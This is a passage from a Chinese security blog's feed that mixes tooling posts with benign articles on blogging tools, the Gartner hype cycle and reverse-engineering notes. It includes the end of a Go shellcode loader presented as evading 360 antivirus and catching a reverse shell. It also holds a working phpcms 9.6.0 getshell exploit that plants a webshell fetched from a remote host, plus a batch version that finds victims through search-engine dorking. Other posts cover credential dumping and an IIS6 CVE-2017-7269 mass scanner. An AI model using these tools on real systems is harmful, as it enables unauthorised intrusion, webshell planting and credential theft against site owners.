"\xa3\xa2\xdb\x06\xc0\x3f\xaf\x41\x73\xba\xf7\x20\x13" buf += "\x98\x8c\xff\xfa\x0a\xda\x6e\xf2\x6d\xc3\x81\x07\xc0" buf += "\x1b\x37\xeb\xa2\xa9\x32\x71\xaf\xe9\x20\xd1\xaa\x9e" buf += "\xbd\x82\xf3\x81\x1f\xab\xbf\xc4\xd9\x6c\x75\x37\x3a" buf += "\x53\x78\x90\x79\xaf\x93\x1b\xb3\x15\x09\xe5\x45\x5c" buf += "\x26\x0f\x0d\x16\x52\xf1\x8a\x7e\x8b\xc4\x50\x8e\x0a" buf += "\x38\x2f\x2b\x40\x73\x0b\xf0\x51\x5f\xc6\xbf\x04\x47" buf += "\x80\x36\xe5\x88\x88\xb3\xfc\xa0\x52\xfe\x92\x81\x8d" buf += "\x89\xf2\x6a\xcc\x7f\x9a\xe9\x1a\x30\x73\xa3\x63\x42" buf += "\x10\xe9\xcf\x62\xe4\x06\x52\xe1\x8d\x88\xfe\x52\xc4" buf += "\xc3\xed\x7a\x0e\x66\x5f\x8c\x2c\xef\xfa\xbd\x8c\x79" buf += "\x6c\x01\xe3\x5c\xde\xc4\x8a\x4c\x7d\x34\x32\xb5\x23" buf += "\x56\x6c\x52\x3f\x15\x26\x6a\xf8\x6b\x81\x2c\x23\x8d" buf += "\x41\x6e\x24\x30\xc6\xcb\xba\x26\xd4\x3b\x37\xd3\xc6" buf += "\xa8\x5a\x16\x8f\x1e\x27\xca\xcb\xda\x7f\x74\x62\xb2" buf += "\x62\xa6\xb1\xfc\x64\x53\x3a\xa7\xa4\x21\x3d\x79\x08" buf += "\x06\x74\x2a\xa2\xe7\x0d\x68\x16\xa3\x96\xe5\xad\x32" buf += "\x10\xa3\x0f\x49\xc3\x69\xa7\x5b\x61\x1a\xf8\x1d\x9e" buf += "\x9b\x3a\x00\xfc\x18\xc3\x42\x1a\xd6\x44\x5d\xfe\xc5" buf += "\xb6\x68\xd2\xad\x24\xda\x74\xa7\xf3\x66\x9a\x42\x7a" buf += "\x50\xf0\x0b\x47\xbc\xad\x6c\x1e\xca\xbe\x90\xca\xc3" buf += "\x8e\x5b\xde\x66\xe2\xb3\x20\x6f\x38\x17\xc1\xac\xfb" buf += "\xd3\x2f\x91\xa7\xff\x65\xd7\xd0\x25\x4c\xd4\xb3\x35" buf += "\x38\xa1\x82\xb8\x23\x42\xe9\xa5\x95\x8e\xc4\x35\xca" buf += "\x92\xfe\xde\x62\x70\xd6\x7a\x7f\xfd\xfb\xf0\x24\xbd" buf += "\x5d\x6d\x3d\x13\xbc\x1d\x25\x54\x9d\x0e\x68\xc8\x9a" buf += "\x10\x87\xf0\xc9\xac\x37\x57\x84\x23\x5f\x8a\xc0\xab" buf += "\x52\x6e\xae\x79\xa2\xdb\xff\xd8\x41\x28\x8b\xd3\x9d" buf += "\x68\x3c\x55\xf2\xfe\x0c\x8a\x38\xdf\xb3\x80\x9b\x70" buf += "\x2b\x4e\xe1\xfa\x0b\xfe\xf5\xc3\x1a\x0d\x83\xb0\x69" buf += "\xd0\x68\xfb\xe0\xae\xbd\x56\x52\x17\x9a\xf8\x8f\xc0" buf += "\x14\x8c\xb0\xf7\x0e\x87\xfa\x54\xf4\x04\x4a\x5a\xc8" buf += "\x89\x57\x0e\xbf\x7a\x76\x9b\xfe\xb8\x5f\x31\x42\xec" buf += "\xaf\x18\x9e\x3f\xf0\x09\x79\x86\xb3\x08\x29\x50\xfd" buf += "\xc3\x46\x7d\x24\x51\x5b\xd0\x81\x19\x6f\xc2\x2c\x17" buf += "\xab\xa3\xb7\xd9\x6f\x82\xd9\x37\x5f\x38\x01\xd8\xfd" buf += "\xfd\x11\x22\x61\xd0\x92\x45\x37\x4f\x6c\x4e\x91\x3b" buf += "\x42\x07\xc5\x77\xdc\x52\xd6\xc7\x9d\x7b\x62\xba\x1c" buf += "\x62\x3c\xde\xad\x96\x03\x55\xde\x9d\x52\x5c\x5d\x0c" buf += "\x73\x0e\xc3\x4c\xae\x7d\x1c\x7c\x64\xaf\xbb\xce\xa6" buf += "\x02\x0e\xb1\x51\xc4\x2d\x1b\x6b\xb7\x7c\xd9\x4b\xc3" buf += "\x8c\x43\xd6\x1b\x2a\x4f\x5e\x0a\x9a\xd5\x4d\x45\x64" buf += "\x6c\x0c\xc8\xf5\x59\xd7\x45\x36\x85\x99\x8d\x34\x65" buf += "\x21\xd3\x3b\x35\xce\x22\x29\x0c\x4e\xca\x48\x3f\x55" buf += "\x5d\x1b\xda\x35\xc1\x2d" // at your call site, you can send the shellcode directly to the C // function by converting it to a pointer of the correct type. shellcode := []byte(buf) C.call((*C.char)(unsafe.Pointer(&amp;shellcode[0])))&#125; 以上就是全部代码其实Golang还有个执行shellcode的方法是不用内联C语言的，但是我这边测试能接到反弹shell，但是执行命令会直接断开，代码我也贴出来1234567891011121314151617181920212223package mainimport ( "syscall" "unsafe")func ThreadExecute(Shellcode []byte) &#123; var K32 = syscall.MustLoadDLL("kernel32.dll") var CreateThread = K32.MustFindProc("CreateThread") var VirtualAlloc = K32.MustFindProc("VirtualAlloc") var WaitForSingleObject = K32.MustFindProc("WaitForSingleObject") Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE) AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr)) for i := 0; i &lt; len(Shellcode); i++ &#123; AddrPtr[i] = Shellcode[i] &#125; ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0) WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)&#125; 关于断开的原因，希望找出原因的能告知我一下，其实我们会发现，内联C是比较简单的 杀毒测试在代码所在目录cmd执行go build得到二进制文件（或者可以用go build -ldflags=&quot;-s -w&quot;减小体积，go build -ldflags=&quot;-H windowsgui -s -w&quot;去掉命令窗口） 可以看到360的静态查杀和动态查杀都没有发现那么是否正常工作呢 可以看到完全是没问题的，体积比python编译出来的小的多，编译出来是500多kb，然后经过upx压缩了一下（测试upx压缩后功能依旧正常），降低到了200多kb 视频]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[自己网盘的页面生成器(私用公开-Golang)]]></title>
      <url>%2F2017%2F04%2F13%2Fmy-yun-generateHTML-with-golang.html</url>
      <content type="text"><![CDATA[虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的 关于搭建这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync） 关于页面的生成第一阶段那时候只有两三个文件，html页面是我手写的手动增加的 第二阶段此时已经有了一个子目录，文件开始增多，我开始考虑写个简单的先用着，Python的写了，不过速度感觉有点不如意（原谅我的吹毛求疵）,并且有个麻烦事是每次重装系统后需要安装Python，然后我选用了Golang，时间仓促写了一个单页面生成，不进行目录深度遍历的，也就是说我每次新开一个目录需要把这个程序拷贝到当目录下双击生成html 第三阶段文件夹和文件日益增多，上面的方式我已经感觉到特别繁琐了，需要找个机会把代码重构一下，使他更加优化然后我开始着手写第二版，这个版本我没保留，具体功能就是对上一个版本做了一点改进，使它支持了深度遍历但是自从T00ls灵车漂移事件以来，官方管理员给GetWriter老哥（如果谁认识希望告知，希望能致个歉）的一纸封书将此事推上风口浪尖，作为始作俑者，我网站首当其冲，遭受了大量老哥多来自夜间的洗礼（说实话，希望高抬贵手，流量快没了），这件事情持续发酵了两三天，我一直在思考，如何为老哥们带来更良好的观感体验，于是我觉得应该要让这个页面生成器对前端展示的修改更加方便，无须从代码入手，开始了第三版的编写 暂时实现的功能 支持模板 加入了配置文件（其实也是模板） 加入了noView.txt规则（具体表现为这个txt中的文件名将不参与生成html页面）可能以后会抽时间再进行优化，这个时间不定，看哪天自己的需求更高了 更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看至于前端你们别想了，前端之魂在我体内没存在过，哪天兴致来了可能会看看相关知识，这个丑页面就丑着凑合看吧，如果有能力可以进行二次修改 为它搞了一套css与文件类型图标（关于style.css文件，是需要你放到远端在线调用的，你可以上传到七牛，或者你同步的时候放到网站根目录下，然后通过域名+/style.css的方式来调用） 更新记录 对一部分冗余的进行了优化，提升了一丁点效率 可以放到环境变量path了，不需要放到本目录里了，只需要在本目录调用就可以（当然），按照之前的方法也是可以的 对文件li列表做了排序，优先级为后缀名-&gt;文件名 对li列表加了css类，可以自定义li的css了，具体见生成后的文件 为页面生成器搞了一套css，为类型加上了图标，具体效果见下图 下载地址这次不能给抓住机会了，放github吧 代码下载地址 二进制文件下载地址]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[百度搜索引擎取真实地址-python代码]]></title>
      <url>%2F2017%2F04%2F11%2FBaiduSearch-get-realUrl-with-python.html</url>
      <content type="text"><![CDATA[代码123456789101112131415def parseBaidu(keyword, pagenum): keywordsBaseURL = 'https://www.baidu.com/s?wd=' + str(quote(keyword)) + '&amp;oq=' + str(quote(keyword)) + '&amp;ie=utf-8' + '&amp;pn=' pnum = 0 while pnum &lt;= int(pagenum): baseURL = keywordsBaseURL + str(pnum*10) try: request = requests.get(baseURL, headers=headers) soup = BeautifulSoup(request.text, "html.parser") for a in soup.select('div.c-container &gt; h3 &gt; a'): url = requests.get(a['href'], headers=headers).url yield url except: yield None finally: pnum += 1 示例用法123456789101112131415import requestsfrom bs4 import BeautifulSoupheaders = &#123; "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"&#125;def parseBaidu(keyword, pagenum)def main(): for url in parseBaidu("keyword",10): if url: print(url) else: continue]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[phpcms9-6-0 一键getshell工具]]></title>
      <url>%2F2017%2F04%2F10%2Fphpcms9-6-0-getshell-with-python.html</url>
      <content type="text"><![CDATA[介绍 一键化python 1.py http://xxx.com,如果是批量直接运行py文件即可 待办 [] 加入对有验证码phpcms网站的支持 [] 加入批量(已完成) 说明依赖库的安装pip install requests 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# -*- coding:utf-8 -*-'''----------------------Author : AkkumanBlog : hacktech.cn----------------------'''import requestsimport sysfrom random import Randomchars = 'qwertyuiopasdfghjklzxcvbnm0123456789'def main(): if len(sys.argv) &lt; 2: print("[*]Usage : Python 1.py http://xxx.com") sys.exit() host = sys.argv[1] url = host + "/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1" data = &#123; "siteid": "1", "modelid": "1", "username": "dsakkfaffdssdudi", "password": "123456", "email": "dsakkfddsjdi@qq.com", # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0 "info[content]": "&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;", "dosubmit": "1", "protocol": "", &#125; try: rand_name = chars[Random().randint(0, len(chars) - 1)] data["username"] = "akkuman_%s" % rand_name data["email"] = "akkuman_%s@qq.com" % rand_name htmlContent = requests.post(url, data=data) successUrl = "" if "MySQL Error" in htmlContent.text and "http" in htmlContent.text: successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php" print("[*]Shell : %s" % successUrl) if successUrl == "": print("[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n") except: print("Request Error")if __name__ == '__main__': main() 批量123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# -*- coding:utf-8 -*-'''----------------------Author : AkkumanBlog : hacktech.cn----------------------'''import requestsfrom bs4 import BeautifulSoup# from urlparse import unquote //Python2# from urlparse import urlparse //Python2from urllib.parse import quotefrom urllib.parse import urlparsefrom random import Randomchars = 'qwertyuiopasdfghjklzxcvbnm0123456789'headers = &#123; "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"&#125;def parseBaidu(keyword, pagenum): keywordsBaseURL = 'https://www.baidu.com/s?wd=' + str(quote(keyword)) + '&amp;oq=' + str(quote(keyword)) + '&amp;ie=utf-8' + '&amp;pn=' pnum = 0 while pnum &lt;= int(pagenum): baseURL = keywordsBaseURL + str(pnum*10) try: request = requests.get(baseURL, headers=headers) soup = BeautifulSoup(request.text, "html.parser") for a in soup.select('div.c-container &gt; h3 &gt; a'): url = requests.get(a['href'], headers=headers).url yield url except: yield None finally: pnum += 1def saveShell(shellUrl): with open("webShell.txt","a+") as f: f.write("[*]%s\n" % shellUrl)def main(): data = &#123; "siteid": "1", "modelid": "1", "username": "akkumandsad", "password": "123456", "email": "akkakkumafa@qq.com", # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt "info[content]": "&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;", "dosubmit": "1", "protocol": "", &#125; for crawlUrl in parseBaidu("inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1", 10): try: if crawlUrl: rand_name = chars[Random().randint(0, len(chars) - 1)] data["username"] = "akkuman_%s" % rand_name data["email"] = "akkuman_%s@qq.com" % rand_name host = urlparse(crawlUrl).scheme + "://" + urlparse(crawlUrl).hostname url = host + "/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1" htmlContent = requests.post(url, data=data, timeout=10) successUrl = "" if "MySQL Error" in htmlContent.text and "http" in htmlContent.text: successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php" print("[*]Shell : %s" % successUrl) saveShell(successUrl) if successUrl == "": print("[x]Failed : Failed to getshell.") else: continue except: print("Request Error")if __name__ == '__main__': main() 测试图单个 批量 下载地址代码下载地址]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[抓取当前登录用户登录密码的工具：mimipenguin]]></title>
      <url>%2F2017%2F04%2F02%2Fmimipenguin.html</url>
      <content type="text"><![CDATA[Github项目地址 前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。编写思路来自流行的windows密码抓取神器mimikatz 详情通过转储过程和提取那些包含明文密码可能性很高的行（hang），充分利用内存中的明文凭证。通过检查/etc/shadow文件hash,内存中的hash和正则匹配去尝试计算出每个单词的概率 要求 root权限 已支持(以下环境已通过测试) Kali 4.3.0 (rolling) x64 (gdm3) Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2) Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2) XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2) VSFTPd 3.0.3-8+b1 (Active FTP client connections) Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency] openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage) 记录 在内存中的密码 - 100%有效 计划扩大支持和其他凭证位置 努力扩展到非桌面环境 已知bug - 有时gcore会挂起脚本，不过这是gcore导致的问题 开放提出请求和社区研究 计划未来的LDAP研究（nscld winbind等） 联系方式 Twitter: @huntergregal 个人站点: huntergregal.com Github: huntergregal 特别鸣谢 the-useless-one for remove Gcore as a dependency, cleaning up tabs, and adding output option gentilkiki for Mimikatz, the inspiration and the twitter shoutout pugilist for cleaning up PID extraction and testing ianmiell for cleaning up some of my messy code w0rm for identifying printf error when special chars are involved benichmt1 for identifying multiple authenticate users issue ChaitanyaHaritash for identifying special char edge case issues 转载自mimipenguin]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[推荐一个静态博客兼笔记的工具：WDTP]]></title>
      <url>%2F2017%2F04%2F01%2FWalden-Tips-Introdution.html</url>
      <content type="text"><![CDATA[简介WDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。 WDTP（山湖录）可运行于macOS和Windows系统下，旨在提高这两大平台下所有写作/分享者的生产力及生产效率，节约耗时，减少无谓的智能、体力与资源消耗。它适合于以下群体： 以文字、声音、图片、视频为主要内容的写作/记录/创作/分享者 职业或业余作家、小说家、编剧、技术类图书的作者及编撰者 经常记笔记或写点东西的人 写作极客 打算采用静态页面的个人博客 打算采用静态页面的中小企业WDTP的全名是：Walden Tips，中文名称：山湖录，UnderwaySoft开发出品。设计、编程及维护：SwingCoder。立项日期：2016年8月2日，第一个内测版发布日期：2017年2月3日。 核心功能 创作。对职业作家（特别是技术作家以及需要大量构思与情节编排的文艺作家）来说比Pages、Word等WYSWYG类型的桌面文字软件更加高效、简洁和灵活的内容创作、章节管理与格式化排版工具。可方便地实现多章节（情节、场景、概念、故事主线等）并发创作/编辑、任意调序、随意归类等强大功能，完稿后一键即可成书。 笔记。可随时记录并管理学习笔记、读书笔记以及有一定篇幅并打算结构化保存、管理、检视和封装的零星随记、杂感等等。可定期将所有或任意分类（目录）下的笔记“装订成册”、集中输出，一键即可完成。 建站。强大而新颖的静态网站维护、编辑、生成、代码调试与内容、结构管理系统。特别适合追求全站真正静态化、内容至上的个人博客与中小企业官网。 Markdown编辑器。在保留并规范了大部分“正统”Markdown语法的基础上，WDTP根据大多数作者/作家的实际需求，增加了一批非常实用的新文本标记语法。比如：插入图注和表注、居中、靠右、多种类型的表格、图文混排、插入音视频媒体文件、内容注释、跨文档扩展标记等等。该编辑器针对Windows系统和macOS系统（非Retina显示屏）对中文字体的渲染结果不尽人意等情况专门做了特殊优化与调整，使用户在输入、编辑时可获得更良好的体验。 以上几项，不仅可以文字输入，更可以语音输入，直接记录声音。这一点对不擅长文字表达的朋友或者记者、演员、各类主持人、音乐家、演奏家等群体来说非常方便。 WDTP还有极具实用价值的“复习/提醒”功能，文档隐身功能，文档缩略语功能和极其强悍的“智库”架构。其他更多…… 在“笔记、写书、建站/博客、前端开发”这几个方面，WDTP（山湖录）无缝集成，一键切换。即：同一套内容，随时可生成上述任何一种类型，还可多种类型混合使用。 程序采用c++语言编写，作者同时也是我十分敬重的一位程序员，如果想查看更多信息请访问他的项目主页程序开源github地址 上手使用本来想说更多的，但是确实这款软件和其他的静态博客生成器不一样，拥有着方便的界面，支持english和中文，设置里面即可切换，相信只要你使用过，你就会使用它，能感受到他的方便快捷，如果想看更多玩法和说明请查看项目主页，现在只支持两种模板book(用来作为笔记)和blog(用来生成静态博客)，不过作者说会逐渐增加主题，真的除了暂时主题匮乏之外(会前端的可以自己改改主题)，其他的功能相比于其他的静态博客生成器方便得不是一丁半点 那么生成静态文件之后如何上传到自己的vps或者github pages或者coding pages呢？ 上传到vps这个你可以使用常规的FTP或者Rsync或者其他方法上传，不过我推荐自己的做法(使用Resilio Sync)如果你的服务器是windows那么你只需要去Resilio Sync官网下载，建议安装为服务，然后访问本机sync服务的网址，点击右上角添加文件夹添加你的网站根目录，然后复制读写key，本机安装Resilio sync客户端然后手动连接这个key到你的静态文件目录，具体可以查资料，这个不难如果你的服务器是Linux，可以查看Resilio Sync网站上面的How to install Sync Package on Linux，说明比较详细，安装好之后和上面的步骤一样，然后只要你本机挂着resilio sync软件，生成就可以即时同步。trust me， 你将找到这个软件(Resilio Sync)更多的玩法，这软件之前的名字是btsync当然，这只是我自己使用的方法，你也可以使用其他方法至于上传到github pages或者coding pages，这个你需要会用git，进入静态文件目录，然后bash下执行1234git initgit add .git commit //命令给文件一个仓库标记，做为仓库历史，便于以后在远程端查找git remote add origin git@github.com:username/username.github.io.git git@github.com:username/username.github.io.git的是你的git远端地址，至于为什么用这个是因为ssh创建公钥之后不用重复输入密码注: 如何生成ssh公钥这篇文章是以coding.net为例，不过你生成的id_rsa.pub内容同时也可以添加到github，基本相同的步骤，如果有什么疑问可以百度一下关键词为github ssh公钥 配置 添加评论功能 如果你不愿意麻烦可以使用邮箱来收集评论打开qq邮箱点击上方设置-&gt;账户-&gt;邮我-&gt;使用邮我然后获取代码复制&lt;a target=&quot;_blank&quot; href=&quot;http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg&quot; style=&quot;text-decoration:none;&quot;&gt;然后打开你的项目文件夹/themes/blog/article.html，把相应的地方改为下面例子这样123&lt;div class=page_navi align="center"&gt; &lt;b&gt;&lt;a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg" style="text-decoration:none;"&gt;评论/咨询/讨论/留言&lt;/a&gt;&lt;/b&gt;&lt;/div&gt; 然后别人点击评论就可以打开给你发邮件的入口 如果你想添加社会化评论系统鉴于多说即将关闭，国内没被墙的无需北岸的第三方评论已经很少了，这里我用来必力做例子 注册登录(如果chrome浏览器注册之后一直登录不了请使用火狐) 点击顶栏安装，然后填好相关信息获取代码 然后打开你的项目文件夹/themes/blog/article.html，把原先的评论代码删除掉，在合适的地方插入上方代码，我插入完之后的article.html例子如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!doctype html&gt;&lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="Generator" content="WDTP by UnderwaySoft"&gt; &lt;meta name="Author" content="&#123;&#123;author&#125;&#125;"&gt; &lt;meta name="Keywords" content="&#123;&#123;keywords&#125;&#125;"&gt; &lt;meta name="Description" content="&#123;&#123;description&#125;&#125;"&gt; &lt;link rel="stylesheet" type="text/css" href="&#123;&#123;siteRelativeRootPath&#125;&#125;add-in/style.css"/&gt; &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; &#123;&#123;siteLogo&#125;&#125; &#123;&#123;siteMenu&#125;&#125; &lt;hr&gt; &#123;&#123;siteNavi&#125;&#125; &#123;&#123;content&#125;&#125; &lt;hr&gt; &#123;&#123;createAndModifyTime&#125;&#125; &lt;div align=center&gt;&lt;h5&gt;&lt;p style="background:PowderBlue"&gt; 本文版权：&#123;&#123;siteLink&#125;&#125; &amp;emsp; 共享协议：&lt;a href='http://creativecommons.org/licenses/by-nc-nd/2.5/deed.zh' target='_blank'&gt;署名-非商业使用-禁止演绎&lt;/a&gt;&lt;/h5&gt; &lt;/div&gt; &lt;hr&gt; &#123;&#123;previousAndNext&#125;&#125; &#123;&#123;ad&#125;&#125; &lt;p&gt; &#123;&#123;random&#125;&#125; &lt;hr&gt; &lt;!-- 来必力City版安装代码 --&gt; &lt;div id="lv-container" data-id="city" data-uid="MTAyMC8yODAwMC80NTc3"&gt; &lt;script type="text/javascript"&gt; (function(d, s) &#123; var j, e = d.getElementsByTagName(s)[0]; if (typeof LivereTower === 'function') &#123; return; &#125; j = d.createElement(s); j.src = 'https://cdn-city.livere.com/js/embed.dist.js'; j.async = true; e.parentNode.insertBefore(j, e); &#125;)(document, 'script'); &lt;/script&gt; &lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;/noscript&gt; &lt;/div&gt; &lt;!-- City版安装代码已完成 --&gt; &#123;&#123;contact&#125;&#125; &#123;&#123;bottomCopyright&#125;&#125; &lt;/body&gt;&lt;/html&gt; 最后的效果如图 最后要说的这个工具确实是十分方便的，如果你作为笔记，可以使用坚果云来同步，同时它可以打包你的数据，多说无益，试用之后你会感受到它的强大 本文部分转自Underwaysoft]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[iis6-0 cve-2017-7269 批量验证脚本]]></title>
      <url>%2F2017%2F04%2F01%2Fiis6-0-cve-2017-7269.html</url>
      <content type="text"><![CDATA[代码地址 12345678910111213141516171819202122232425262728293031import subprocessf = open('ips.txt', 'r')flines = f.readlines()vulnsrvs = 0i = 1for line in flines: host = line.split(":") ip = host[0].replace('\n','') port = host[1].replace('\n','') print "Try (" + str(i) +") "+ str(ip) +":" + str(port) if port == "443": #dont bother with SSL/TLS continue try: myout = subprocess.check_output(['curl', '--connect-timeout', '2', '--max-time', '2', '-s','-I', '-X', 'PROPFIND','http://' + ip + ':' + port + '/' ]) print myout if "HTTP/1.1 411 Length Required" in myout: print "Found one:" print myout vulnsrvs += 1 except Exception, e: print str(e.output) i += 1 print "Vulnerable: " + str(vulnsrvs) 说明ips.txt 是待验证的列表格式为：123129.112.44.1:80129.112.44.2:81129.112.44.43:8808 它不检测443端口（HTTPS）你也可以简单改一下进行网段批量验证。 转自群友CF_HB]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[推荐一个十分好看的开源博客系统]]></title>
      <url>%2F2017%2F03%2F12%2Fa-beautiful-open-source-blog-lcm.html</url>
      <content type="text"><![CDATA[推荐一个十分好看的开源博客系统，直接百度“里程密”地址www.lcm.wang 附图 主页 后台 浓浓的科技简约风，适合做技术的你]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[技术的热门度曲线]]></title>
      <url>%2F2017%2F03%2F12%2Ftechnology-s-popularity-curve.html</url>
      <content type="text"><![CDATA[全球最大的 IT 咨询公司高德纳（Gartner），有一个”技术热门度曲线“模型（Gartner Hype Cycle）。 该模型认为，一门技术的发展要经历五个阶段。 启动期（Innovation Trigger）该技术刚刚诞生，还只是一个概念，不具有可用性，无法评估商业潜力。媒体有所报道，引起了外界的兴趣。 泡沫期（Peak of Inflated Expectations）该技术逐步成型，出现了个别成功的案例，一些激进的公司开始跟进。媒体开始大肆报导，伴有各种非理性的渲染，产品的知名度达到高峰。 低谷期（Trough of Disillusionment）该技术的局限和缺点逐步暴露，对它的兴趣开始减弱。基于它的产品，大部分被市场淘汰或者失败，只有那些找到早期用户的公司艰难地活了下来。媒体对它的报道逐步冷却，前景不明。 爬升期（Slope of Enlightenment）该技术的优缺点越来越明显，细节逐渐清晰，越来越多的人开始理解它。基于它的第二代和第三代产品出现，更多的企业开始尝试，可复制的成功使用模式出现。媒体重新认识它，业界这一次给予了高度的理性的关注。 高原期（Plateau of Productivity）经过不断发展，该技术慢慢成为了主流。技术标准得到了清晰定义，使用起来越发方便好用，市场占有率越来越高，进入稳定应用阶段。配合它的工具和最佳实践，经过数代的演进，也变得非常成熟了。业界对它有了公认的一致的评价。 该模型的细节可以查看维基百科的大图。 高德纳公司每年都会公布，当年的热门技术图。下面就是去年七月的图。 上图中，4D打印处于”启动期”，区块链处于”泡沫期”，增强现实处于”低谷期”，虚拟现实处于爬升期。 本周，有人进行数据分析后，建立了一个名叫 State.of.Dev 的网站，提供各种技术的热门程度图。 下图是编程语言。 上图中，Rust 语言处于启动期，Go 语言处于泡沫期，Ruby 语言处于低谷期，Object-C 处于爬升期，PHP 和 Java 处于高原期。 下图是 Web 技术。 上图中，WebAssembly 处于启动期，WebRTC 处于低谷期，HTTPS 处于高原期。 一门技术到底前景如何，很难预测，但是它的热门程度却是可以衡量的（比如在社交媒体提及次数的增长幅度）。风险投资跟热门程度高度正相关，越热门的技术越容易拿到投资。 用户可以采用这张图，判断技术处在哪一个阶段，确定它的热门程度。简单的使用规则如下。 “争取风险投资，要选择热门的技术；解决实际问题， 要选择可靠的技术。” 简单说，处于启动期的技术，风险很大，不确定性极高，但是一旦成功，回报可能也很高，适合创业公司；处于高原期的技术，非常可靠，风险低，有成熟的解决方案和配套工具，适合大公司和企业的内部应用。 反过来说，如果一门技术处于高原期了，就代表它非常成熟了，人们对它能干什么和不能干什么，都已经很了解了，也没有新的期待了，技术本身的潜力已经不大了，所以用它拿不到投资，只能用来干活。 （完） 转载自阮一峰的网络日志]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[逆向学习笔记（2）-这是代码还是数据]]></title>
      <url>%2F2017%2F03%2F10%2Freverse-engineering-study-note-2-is-this-code-or-data.html</url>
      <content type="text"><![CDATA[以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同 现象12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int getmin(int a, int b)&#123; if(a&gt;b) return b; else return a;&#125;typedef int (*pfunction)(int, int);int main()&#123; int a=456789,b=123789,c=0; pfunction pGetmin = (pfunction)getmin; c = pGetmin(a, b); printf("%d",c); return 0;&#125; 上面这段代码是比大小输出小的，typedef int (*pfunction)(int, int);定义了一个函数指针，但是下面这段代码和上面的功能是完全一样的 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef int (*pfunction)(int, int);int main()&#123; int a=456789,b=123789,c=0; unsigned char loc[] = &#123; 0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3 &#125;; pfunction getmin = (pfunction)&amp;loc; c = getmin(a, b); printf("%d",c); return 0;&#125; 原因分析当c = pGetmin(a, b);调用pGetmin的时候，在汇编中是先call跳到一个地址然后从那个地址再jmp到函数入口地址然后开始执行函数getmin函数整体汇编为12345678910push ebpmov ebp,espmov eax,DWORD PTR [ebp+0x8]cmp eax,DWORD PTR [ebp+0xc]jle &lt;getmin+16&gt;mov eax,DWORD PTR [ebp+0xc]jmp &lt;getmin+19&gt;mov eax,DWORD PTR [ebp+0x8]pop ebpret 通过一些调试程序（发现CodeBlocks带的汇编调试没有vc6好用，看不到硬编码）可以得出这段汇编代码在硬编码中的值为10x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 